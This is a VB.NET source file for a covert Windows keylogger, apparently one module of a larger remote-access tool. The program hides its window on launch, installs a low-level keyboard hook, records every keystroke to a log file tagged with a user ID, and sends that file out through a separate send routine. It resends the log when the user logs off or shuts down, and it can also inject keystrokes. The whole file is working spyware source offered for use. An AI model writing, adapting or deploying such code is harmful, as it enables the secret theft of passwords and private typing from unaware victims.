Imports System.Runtime.InteropServices
Public Class Main
    Dim threadkeylogger As Threading.Thread
    Dim keyloggerLog As String = Nothing
    Dim isLoggin As Boolean = False
    Private WithEvents kbHook As KeyboardHook
    Private WithEvents KeyProc As KeyProcessor
    Dim KeyloggerSwitch As Boolean = False

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        CheckForIllegalCrossThreadCalls = False
        parameters = Command()
        StartUp.Init()
        ReadParameters(parameters)
        AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
    End Sub

    Sub StartRecording()
        AddToLog("StartRecording@Main", "Inicializing record...", False)
        Try
            If Not isLoggin Then
                AddToLog("StartRecording@Main", "Starting recording...", False)
                isLoggin = True
                kbHook = New KeyboardHook()
                AddHandler kbHook.KeyUp, AddressOf kbHook_KeyUp
            Else
                AddToLog("StartRecording@Main", "Already recording...", False)
            End If
        Catch ex As Exception
            AddToLog("StartRecording@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StopRecording()
        AddToLog("StopRecording@Main", "Stopping record...", False)
        Try
            If isLoggin Then
                kbHook.FinalizeHK()
            End If
            End
        Catch ex As Exception
            AddToLog("StopRecording@Main", "Error: " & ex.Message, True)
            End
        End Try
    End Sub
    Sub SendRecord()
        AddToLog("SendRecord@Main", "Sending record...", False)
        Try
            If isLoggin Then
                kbHook.FinalizeHK()
            End If
            Dim fileName As String = "usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_Keylogger.log"
            Dim filePath As String = DIRHome & "\" & fileName
            If My.Computer.FileSystem.FileExists(filePath) Then
                My.Computer.FileSystem.DeleteFile(filePath)
            End If
            My.Computer.FileSystem.WriteAllText(filePath, keyloggerLog, False)
            BoroHearSendFile(filePath)
            isLoggin = False
            ResetRecord()
            StartRecording()
        Catch ex As Exception
            AddToLog("SendRecord@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub ResetRecord()
        AddToLog("ResetRecord@Main", "Resetting record...", False)
        Try
            keyloggerLog = Nothing
        Catch ex As Exception
            AddToLog("ResetRecord@Main", "Error: " & ex.Message, True)
        End Try
    End Sub

    Private Sub kbHook_KeyDown(ByVal Key As Keys) Handles kbHook.KeyDown
        AddKeyToLog(Key.ToString)
    End Sub
    Private Sub kbHook_KeyUp(ByVal Key As Keys) Handles kbHook.KeyUp
        AddKeyToLog(Key.ToString)
    End Sub

    Sub AddKeyToLog(ByVal key As String)
        If isLoggin Then
            Select Case key.ToUpper
                Case "SPACE"
                    key = " {" & key.ToUpper & "} "
                Case "RETURN"
                    key = "{" & key.ToUpper & "}" & vbCrLf
                Case Else
                    Dim isAlphabet = alphabet.ToArray().Any(Function(x) x.ToString().Contains(key))
                    If Not isAlphabet Then
                        key = "{" & key.ToUpper & "}"
                    End If
            End Select
            keyloggerLog &= key
            'Console.WriteLine(key)
        End If
    End Sub
    Sub StartKeyProc(ByVal theString As String)
        Try
            KeyProc = New KeyProcessor
            Dim threadKeyProc As Threading.Thread = New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf KeyProc.ProcesarTeclas))
            threadKeyProc.Start(theString.TrimEnd)
        Catch ex As Exception
            AddToLog("StartKeyProc@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
        Try
            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
                AddToLog("SessionEvent", "User is logging off!", True)
            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
                AddToLog("SessionEvent", "System is shutting down!", True)
            Else
                AddToLog("SessionEvent", "Something happend!", True)
            End If
            If isLoggin Then
                SendRecord()
                End
            End If
        Catch ex As Exception
            AddToLog("SessionEvent@Init", "Error: " & ex.Message, True)
        End Try
    End Sub
End Class
Public Class KeyProcessor
    Public Event KeyDown(ByVal Key As Keys)
    Public Event KeyUp(ByVal Key As Keys)
    Public Sub New()
    End Sub
    <DllImport("user32.dll")>
    Public Shared Sub keybd_event(bVk As Byte, bScan As Byte, dwFlags As UInteger, dwExtraInfo As UInteger)
    End Sub
    Sub ProcesarTeclas(ByVal listaTeclas As String)
        Try
            Const KEYEVENTF_KEYUP = &H2
            For Each ky As String In listaTeclas.Split(" ")
                Dim Key As Keys = [Enum].Parse(GetType(Keys), ky, True)
                keybd_event(Key, 0, 0, 0)
                keybd_event(Key, 0, KEYEVENTF_KEYUP, 0)
                Threading.Thread.Sleep(500)
            Next
        Catch ex As Exception
            AddToLog("ProcesarTeclas@KeyProcessor", "Error: " & ex.Message, True)
        End Try
    End Sub
End Class
Public Class KeyboardHook
    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)>
    Private Overloads Shared Function SetWindowsHookEx(ByVal idHook As Integer, ByVal HookProc As KBDLLHookProc, ByVal hInstance As IntPtr, ByVal wParam As Integer) As Integer
    End Function
    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)>
    Private Overloads Shared Function CallNextHookEx(ByVal idHook As Integer, ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
    End Function
    <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)>
    Private Overloads Shared Function UnhookWindowsHookEx(ByVal idHook As Integer) As Boolean
    End Function
    <StructLayout(LayoutKind.Sequential)>
    Private Structure KBDLLHOOKSTRUCT
        Public vkCode As UInt32
        Public scanCode As UInt32
        Public flags As KBDLLHOOKSTRUCTFlags
        Public time As UInt32
        Public dwExtraInfo As UIntPtr
    End Structure
    <Flags()>
    Private Enum KBDLLHOOKSTRUCTFlags As UInt32
        LLKHF_EXTENDED = &H1
        LLKHF_INJECTED = &H10
        LLKHF_ALTDOWN = &H20
        LLKHF_UP = &H80
    End Enum
    Public Shared Event KeyDown(ByVal Key As Keys)
    Public Shared Event KeyUp(ByVal Key As Keys)
    Private Const WH_KEYBOARD_LL As Integer = 13
    Private Const HC_ACTION As Integer = 0
    Private Const WM_KEYDOWN = &H100
    Private Const WM_KEYUP = &H101
    Private Const WM_SYSKEYDOWN = &H104
    Private Const WM_SYSKEYUP = &H105
    Private Delegate Function KBDLLHookProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
    Private KBDLLHookProcDelegate As KBDLLHookProc = New KBDLLHookProc(AddressOf KeyboardProc)
    Private HHookID As IntPtr = IntPtr.Zero
    Dim lastKey As Keys = Nothing
    Private Function KeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
        If (nCode = HC_ACTION) Then
            Dim struct As KBDLLHOOKSTRUCT
            Dim keyString As Keys = Nothing
            keyString = CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys)
            Select Case wParam
                'Case WM_KEYDOWN, WM_SYSKEYDOWN
                '    RaiseEvent KeyDown(CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
                'Case WM_KEYUP, WM_SYSKEYUP
                '    RaiseEvent KeyUp(CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
                Case WM_KEYDOWN
                    RaiseEvent KeyDown(keyString)
                    'Case WM_KEYUP
                    '    RaiseEvent KeyUp(keyString)
            End Select
        End If
        Return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam)
    End Function
    Public Sub New()
        HHookID = SetWindowsHookEx(WH_KEYBOARD_LL, KBDLLHookProcDelegate, Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
        If HHookID = IntPtr.Zero Then
        End If
    End Sub
    Sub FinalizeHK()
        If Not HHookID = IntPtr.Zero Then
            UnhookWindowsHookEx(HHookID)
        End If
        MyBase.Finalize()
    End Sub
End Class